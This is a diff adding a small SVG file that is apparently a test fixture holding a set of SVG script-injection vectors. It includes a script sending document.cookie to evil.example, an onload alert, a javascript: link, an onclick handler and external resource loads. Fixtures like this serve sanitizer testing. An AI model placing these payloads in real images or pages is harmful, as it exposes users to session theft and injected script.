@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 64 64" onload="alert(1)">
+  <script>fetch('https://evil.example/'+document.cookie)</script>
+  <style>@import url(https://evil.example/x.css); .a{fill:#3b82f6}</style>
+  <image href="https://evil.example/tracker.png" x="0" y="0" width="64" height="64"/>
+  <use xlink:href="https://evil.example/sprite.svg#a"/>
+  <a xlink:href="javascript:alert(2)"><circle class="a" cx="32" cy="32" r="20" onclick="steal()">
+    <animate attributeName="r" dur="900ms" values="20;24;20"/>
+  </circle></a>
+  <foreignObject width="64" height="64"><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject>
+  <use href="#nothing"/>
+</svg>
